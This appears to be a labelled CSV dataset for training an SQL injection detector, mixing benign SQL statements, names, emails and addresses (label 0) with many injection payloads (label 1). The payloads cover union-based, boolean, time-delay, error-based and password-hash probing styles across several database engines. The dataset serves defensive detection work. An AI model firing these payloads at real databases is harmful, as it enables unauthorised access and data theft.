Query,Label
15,0
"-9922'   )    )    union all select 2193,2193,2193--",1
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'vwtq'  =  'vwtq",1
"SELECT Orders.hiddenrID, Employees.bone, Employees.safe FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.planID ORDER BY Orders.frequentlyID",0
4.46161E+14,0
d2s32bearse,0
"SELECT shine,further,well,decide,older     (  (  curious JOIN dried ON definition.product =  during.mice )   INNER JOIN motherON Orders.east =  slabs.jarID )",0
72484997z,0
SELECT * FROM various WHERE gold = 'local' FETCH FIRST 3 ROWS ONLY,0
"1' in boolean mode  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT * FROM population WHERE question = 'certain',0
SELECT column_name FROM table_name WHERE column_name operator ALL,0
"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",1
1e1ador,0
a' waitfor delay '0:0:10'--,1
23531966e,0
valls,0
SELECT TOP 3 * FROM arrow WHERE having = 'corn',0
DELETE FROM express WHERE adult = 'spin',0
SELECT * FROM gate FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM direct,0
SELECT sea ( s ) FROM while INNER JOIN,0
SELECT column_name FROM table_name WHERE column_name IN  (,0
anything' OR 'x'  =  'x,1
"UPDATE success SET without =  'question', City =  'raw' WHERE swept =  further",0
"1  )   union all select null,null,null,null#",1
SELECT leaf ( s )  FROM to UNION,0
backes@kimkardashian.com.lk,0
"1'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   'rnyb'  =  'rnyb",1
"1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"SELECT fix AS hollow, dull AS [recall]  FROM over",0
"1  )   where 9012  =  9012 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM birth WHERE organization = 'consonant',0
SELECT * FROM feet  WHERE passage = function,0
dido,0
33825,0
aventajada,0
"SELECT * FROM force ORDER BY powerful, art",0
84881293t,0
"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",1
"1"" where 4688  =  4688 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
SELECT MIN ( bound )  AS slope FROM date,0
SELECT * FROM slowly WHERE    NOT stepped = 'able',0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'lijy'  =  'lijy",1
rocky,0
SELECT * FROM win WHERE potatoes BETWEEN 'research' AND 'hospital',0
g1ne136,0
SELECT government FROM regular UNION SELECT exist FROM rope ORDER BY bite,0
SELECT * FROM piece WHERE raw = 'wide'  AND  ( brass = 'hat' OR newspaper = 'understanding' ),0
SELECT * FROM let ORDER BY wave,0
"SELECT * FROM labor WHERE noted BETWEEN ""fresh"" AND    ""count""",0
"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'weof'  =  'weof",1
"1%""   )    )    order by 1#",1
"-5196""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""gbcq"" like ""gbcq",1
albillos,0
SELECT * FROM level WHERE sport BETWEEN satellites09/01/1996modern AND fill15/31/1996opportunity,0
"-8005""  )   union all select 5213,5213,5213,5213,5213--",1
UPDATE new SET silver = 'slabs'WHERE headed = 'shoe',0
"1'  )   where 9951  =  9951   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1
"-1722' union all select 1408,1408,1408#",1
SELECT TOP 3 * FROM grew SELECT * FROM sang 3SELECT * FROM am,0
-9072  )   as saot where 2278  =  2278 order by 1#,1
SELECT TOP 50 PERCENT * FROM somewhere,0
SELECT science ( s )  FROM major FULL OUTER JOIN,0
SELECT shelf ( s FROM attached RIGHT JOIN,0
"-1823 where 6852  =  6852 union all select 6852,6852,6852,6852,6852,6852#",1
"select * from users where id  =  '1' <@._ union select 1,version  (    )   -- 1'",1
waitfor delay '0:0:5'-- thuo,1
"1%'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   '%'  =  '",1
"1'+  (  select 'ovti' where 4243  =  4243 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",1
6ilia+ria,0
lengua barrios,0
"1'   )    )    as tfub where 3461  =  3461 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'rfgj' like 'rfgj",1
lanae,0
"1'  )   union all select null,null,null,null,null,null,null--",1
26774865j,0
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'yhpp' like 'yhpp",1
SELECT * FROM although 3 SELECT * FROM frozen,0
dziawa,0
2399,0
kokosopo,0
"1%""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""%""  =  """,1
"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'pbqg'  =  'pbqg",1
SELECT * FROM under FETCH FIRST 3 ROWS ONLY,0
"-2131"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""wpsf"" like ""wpsf",1
g5adae3a,0
"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",1
"SELECT Orders.OrderID, Employees.LastName, Employees.FirstNameFROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID ORDER BY Orders.OrderID;",0
"SELECT Employees.surrounded, COUNT ( Orders.exclaimedID )  AS rushFROM    ( OrdersINNER JOIN accurate ON Orders.herselfID  =  Employees.sitID )",0
"UPDATE nice SET surprise =  'rope', City =  'beginning' WHERE later =  image",0
SELECT * FROM pitch ORDER BY row,0
SELECT * FROM of  WHERE unknown = shout,0
"-5672%"" or 3825  =  9675--",1
or 1  =  1 or ''  =  ',1
"-7531'   )    )     )   union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",1
SELECT find ( s ) FROM produce INNER JOIN,0
1'   )    )    as qaki where 5272  =  5272,1
"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",1
1  )   as vxsh where 4706  =  4706,1
"-6007""   )    )    union all select 6019,6019,6019,6019,6019,6019,6019,6019--",1
SELECT * FROM  ( SELECT what FROM complex ),0
SELECT * FROM halfway WHERE NOT spell = 'vote'  AND NOT straight = 'ship',0
"SELECT * FROM cheese ORDER BY tone, personal",0
"SELECT * FROM quick WHERE dry NOT IN  ( 'ill', 'canal', 'research' )",0
SELECT offer ( s )  FROM speak LEFT JOIN,0
SELECT * FROM itself WHERE experience NOT BETWEEN 'sound' AND 'measure',0
"1%""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,1
99783130e,0
craggs,0
"-9718%""  )   union all select 9515,9515,9515#",1
c8nde9a,0
SELECT * FROM grandfather WHERE policeman = 'small',0
"SELECT understanding, seldom+ ', ' + dull+ ' ' + route+ ', ' + fully AS ill  FROM nine",0
SELECT * FROM wide FETCH FIRST 50 PERCENT ROWS ONLY,0
"1"" union all select null,null,null,null,null--",1
"-6279'  )   union all select 3026,3026,3026,3026,3026,3026,3026,3026--",1
-9700'  )   or 8811  =  7862,1
"1"" where 5927  =  5927",1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   '%'  =  ',1
"SELECT DAYNAME ( ""2017-06-15"" ) ;",0
"-8609%""   )    )     )   union all select 6021,6021,6021,6021,6021,6021--",1
"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3088' LIMIT 1,0
SELECT DISTINCT missing FROM son,0
que3h5a,0
"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",1
queral queral,0
"select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",1
SELECT COUNT ( warnID ) FROM third,0
SELECT Count ( * )  AS column,0
SELECT * FROM grabbed WHERE mass = 'pictured' FETCH FIRST 3 ROWS ONLY,0
chimillas,0
SELECT * FROM unless WHERE    NOT fine = 'comfortable',0
"SELECT gradeID AS ID, over AS entirely FROM but",0
SELECT * FROM anywhere WHERE hurt = 'under' FETCH FIRST 3 ROWS ONLY,0
SELECT PI (  ) ;,0
fuente el saz,0
SELECT * FROM rush ORDER BY important,0
"-6772""   )    )    or 9323  =  9323#",1
SELECT * FROM beside WHERE wise = 'frog'  AND City = 'sets',0
SELECT * FROM group ORDER BY putting,0
"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 416 )  ORDER BY meta_id ASC",0
SELECT social ( s )  FROM principal UNION ALL,0
"SELECT trace AS scientist, bus AS [rod]  FROM bush",0
50645313a,0
gayol,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262335 )  ORDER BY meta_id ASC",0
"SELECT birdsID AS ID, suit AS still FROM rubbed",0
cu2tre8a,0
"-6112""  )   union all select 8203,8203,8203,8203,8203,8203,8203--",1
monteon pasquina,0
9.08272E+14,0
benchley@11horas.fk,0
1' in boolean mode  )   and 5725  =  5552#,1
"1'  )   as bagi where 1281  =  1281   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
"1""   )    )    as puws where 7006  =  7006",1
"SELECT Orders.primitiverID, Employees.fair, Employees.brief FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.identityID ORDER BY Orders.neighborhoodID",0
"-4670""   )    )    or 3038  =  3038",1
"SELECT nothing, like+ ', ' + represent+ ' ' + success+ ', ' + gray AS battle  FROM birth",0
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1
SELECT * FROM dozen  WHERE screen NOT LIKE '[combination]%',0
"1'+  (  select niht where 7294  =  7294 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT pilot ( s )  FROM told,0
SELECT * FROM like 3,0
par4u8i67t3,0
SELECT swimming FROM explore UNION SELECT therefore FROM hungry ORDER BY base,0
"1"" where 8387  =  8387",1
FROM  ( SELECT DISTINCT rhyme FROM cake ),0
"1""  )   and elt  (  1889  =  7397,7397  )   and   (  ""kuau""  =  ""kuau",1
DELETE FROM raise WHERE value = 'clock',0
SELECT AVG ( Price ) FROM stream,0
"1""   )    )    as fmul where 7827  =  7827",1
SELECT TOP 3 * FROM appropriate WHERE active = 'series' SELECT * FROM event,0
SELECT * FROM touch 3 SELECT * FROM military,0
SELECT * FROM Customers  ORDER BY Country DESC;,0
micr6pil8,0
"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",1
-5258  )   or   (  8459  =  8459  )  *4906,1
"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""otgh"" like ""otgh",1
SELECT * FROM mass WHERE ocean = 'syllable'  AND City = 'characteristic',0
retasac5n,0
SELECT * FROM handsome WHERE five = 'anyway' FETCH FIRST 3 ROWS ONLY,0
61tico,0
1.93371E+15,0
"1%'  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1'  )   where 9272  =  9272,1
SELECT MIN ( customs )  AS telephone FROM zipper,0
SELECT * FROM bag,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""kngx"" like ""kngx",1
urko,0
jaspe ochoa,0
6.24331E+15,0
SELECT * FROM below WHERE tonight = 'sick'  AND  ( year = 'labor' OR she = 'too' ),0
SELECT DISTINCT cannot FROM feature,0
"SELECT angry, men, money FROM section WHERE throat  IS NULL",0
calle rafael bravo gomez 179 5?h,0
SELECT * FROM weather WHERE NOT stay = 'just'  AND NOT concerned = 'respect',0
grace,0
21468433a,0
c632i6ela,0
"1""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""nnmz"" like ""nnmz",1
"1%""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1'+  (  select 'mtpt' where 7483  =  7483 union all select null,null,null,null,null,null,null,null,null--",1
subhashi,0
SELECT * FROM past WHERE correctly = 'remarkable' LIMIT 3,0
lowietje,0
SELECT * FROM monkey WHERE basket = 'corn' LIMIT 3,0
DELETE FROM roof WHERE heat = 'mine',0
"masia can sang, 33",0
SELECT case ( s )  FROM whom LEFT JOIN,0
wenzel,0
if  (  4135  =  2165  )   select 4135 else drop function otyy--,1
5.71439E+15,0
"1' in boolean mode  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",1
SELECT * FROM hair FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM drew,0
88102583w,0
SELECT TOP 3 * FROM perfectly,0
waitfor delay '0:0:5' and   (  'eaxu'  =  'eaxu,1
macedonia 48,0
SELECT AVG ( blue ) FROM shall,0
hallenbe,0
"1  )   as wust where 3884  =  3884 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"SELECT splitID AS ID, shorter AS he FROM list",0
-7021' or 3038  =  3038,1
SELECT * FROM research WHERE when BETWEEN satellites09/01/1996crack AND mistake15/31/1996occur,0
SELECT come FROM frighten,0
"INSERT INTO winter  ( dot, successful, tobacco )  VALUES  ( 'root', 'slide', 'flag' )",0
3.54937E+15,0
-2573   )    )    order by 1#,1
"calle nueva de arriba, 111 9g",0
"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",1
1'||  (  select 'tezo' from dual where 4436  =  4436,1
"1'   )    )    as ticp where 9794  =  9794 union all select null,null,null,null,null,null,null,null--",1
1   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  3505  =  3505,1
SELECT * FROM halfway WHERE hello NOT BETWEEN 'stove' AND 'cow',0
"SELECT Orders.towerrID, Employees.them, Employees.its FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.exactlyID ORDER BY Orders.valleyID",0
SELECT store ( s ) FROM bare INNER JOIN,0
"c/ cardenal cisneros 70, 12?d",0
"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",1
mal3it6,0
zaleska_legon@zampy.so,0
"-9864""  )   or elt  (  5885  =  4936,4936  )   and   (  ""bfbb"" like ""bfbb",1
tu6e3a5a,0
SELECT plain,0
"SELECT LOCATE ( ""3"", ""W3Schools.com"" )  AS MatchPosition;",0
abietceo,0
SELECT * FROM planning WHERE meal = 'property',0
"iif  (  3204  =  8489,3204,1/0  )",1
57i-9557a,0
SELECT * FROM negative ORDER BY lost,0
SELECT * FROM closely WHERE main BETWEEN 'joined' AND 'universe',0
select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',1
60578448j,0
"-9011""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
koock@aridossanchez.mt,0
"1'  )   where 8255  =  8255 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
FROM  ( SELECT DISTINCT ocean FROM teacher ),0
"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
1'   )    )    as yqcl where 5026  =  5026 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1
"1%'   )    )     )   union all select null,null,null,null--",1
SELECT fence FROM coal,0
SELECT MIN ( good )  AS rhythm FROM sentence,0
1.35689E+15,0
bernadet,0
"1'  )   as yjdg where 5262  =  5262 union all select null,null,null#",1
SELECT COUNT ( cold )  FROM frame,0
"-2715'   )    )    union all select 8646,8646,8646,8646,8646,8646,8646,8646--",1
duilio,0
FROM  ( SELECT DISTINCT sum FROM science ),0
"1 where 7072  =  7072 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1
acedera,0
"1%""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""%""  =  """,1
"INSERT INTO shoe  ( shinning, serious, hearing )  VALUES  ( 'cheese', 'population', 'shirt' )",0
"1'  )   where 6772  =  6772 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
"c/ gaspar reyes, 172 8?f",0
hedda,0
SELECT COUNT ( depend ) FROM discuss,0
"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
mclendon,0
"1""   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""duuw""  =  ""duuw",1
c0m51ar,0
emil,0
mary-ann,0
SELECT colony ( s )  FROM cover SELECT molecular FROM how,0
depravador,0
villasandino,0
"-2782"" union all select 2109,2109,2109#",1
bizarro,0
merkling,0
SELECT * FROM brother WHERE occasionally = 'visitor' LIMIT 3,0
"SELECT weather, which, runFROM cowboy WHERE idea  IS NOT NULL",0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c9a3c611fd' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
44394,0
SELECT option_value FROM wp_options WHERE option_name  =  'acf_pro_license' LIMIT 1,0
"1 where 9072  =  9072 and elt  (  4249  =  4249,7259  )  --",1
"select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",1
"SELECT * FROM close ORDER BY bite ASC, heart DESC",0
"martel 153,",0
SELECT * FROM program ORDER BY slipped DESC,0
"1%'  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1' in boolean mode  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  #",1
1%'   )    )    and sleep  (  5  )   and    (    (   '%'  =  ',1
darrieu@redstarz.sv,0
SELECT COUNT ( grabbed )  FROM highway,0
"avinguda guix borrull 170,",0
SELECT COUNT ( helloID ) FROM wall,0
1 or sleep  (  5  ),1
"SELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDateFROM OrdersINNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;",0
SELECT * FROM  ( SELECT shaking FROM forth ),0
belmonte de gracin,0
"-3316%"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""%""  =  """,1
c/ costa i llobera 83,0
9.46936E+15,0
"UPDATE bag SET pet =  'consonant', City =  'another' WHERE outer =  title",0
"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""qkds"" like ""qkds",1
SELECT COUNT ( DISTINCT father )  FROM castle,0
"UPDATE hat SET fuel =  'meat', City =  'differ' WHERE signal =  root",0
"SELECT root AS hunt, long AS [birth]  FROM attention",0
"1%"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""%""  =  """,1
"-6680%""   )    )    union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",1
"1""  )   where 3404  =  3404 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT option_value FROM wp_options WHERE option_name  =  'wpassetcleanup_global_data' LIMIT 1,0
"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",1
-8131'   )    )    or 9680  =  3467,1
SELECT * FROM wing ORDER BY control,0
SELECT AVG ( indicate )  FROM quietly  SELECT SUM ( smooth ),0
"-5891 union all select 7103,7103,7103,7103--",1
SELECT * FROM improve WHERE dropped IN  ( SELECT individual FROM natural ),0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   '%'  =  '",1
"SELECT * FROM us WHERE rather IN  ( 'basic', 'similar', 'certainly' )",0
1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  '%'  =  ',1
"SELECT breadID AS ID, ahead AS feed FROM unhappy",0
SELECT TOP 50 PERCENT * FROM arm,0
"1""  )   where 5719  =  5719 rlike sleep  (  5  )  --",1
"1%'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",1
SELECT * FROM fuel WHERE addition BETWEEN '1996-07-01' AND '1996-07-31',0
select case when 1892  =  3646 then 1 else null end--,1
hengevel,0
SELECT * FROM cake WHERE skill = 'bottom'  AND  ( strike = 'interior' OR aloud = 'couple' ),0
SELECT * FROM down 3,0
"SELECT Orders.taughtrID, Employees.damage, Employees.yet FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fliesID ORDER BY Orders.roughID",0
"1""  )   as dezr where 2145  =  2145 or sleep  (  5  )  #",1
4.27965E+15,0
SELECT * FROM breakfast,0
"SELECT * FROM toy ORDER BY dead ASC, mix DESC",0
di rado elejalde,0
SELECT * FROM should WHERE spell BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT option_value FROM wp_options WHERE option_name  =  'site_logo' LIMIT 1,0
43823011f,0
"SELECT mouse, desk, bat FROM apartment WHERE late  IS NULL",0
"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'rpof' like 'rpof",1
plza. felix rodriguez de la fuente 140 3a,0
gabbai,0
SELECT * FROM charge FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM plural,0
1 where 7038  =  7038,1
zazulak,0
"1'||  (  select 'epjf' from dual where 8584  =  8584 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM habit 3,0
hofmeist0,0
"SELECT COUNT ( roll ) , field FROM die BY are",0
r3i8a83nt1,0
"1%' union all select null,null,null,null#",1
fabiano,0
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,1
"hi or 1  =  1 --""",1
SELECT * FROM yet,0
